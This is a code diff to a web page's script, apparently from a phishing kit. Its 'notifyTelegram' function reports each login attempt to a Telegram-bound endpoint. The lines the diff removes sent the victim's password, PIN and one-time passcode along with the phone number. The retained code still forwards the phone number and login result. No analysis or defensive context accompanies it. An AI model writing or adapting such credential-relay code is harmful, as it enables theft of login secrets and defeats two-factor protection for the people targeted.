@@ -68,7 +68,7 @@ document.getElementById("confirm").onclick=()=>{
   <script>
 async function notifyTelegram(phone, result) {
   try {
-    await fetch("/api/notify", {
+    const response = await fetch("/api/notify", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -76,16 +76,15 @@ async function notifyTelegram(phone, result) {
       body: JSON.stringify({
         event: "login_attempt",
         phone: phone,
-        Password: Password,
-        Pin: Pin,
-        
-        OTP : OTP,
-        
         result: result
       })
     });
+
+    const data = await response.json();
+    console.log("Telegram:", data);
+
   } catch (error) {
-    console.error("Notification failed");
+    console.error("Notification failed:", error);
   }
 }
 </script>
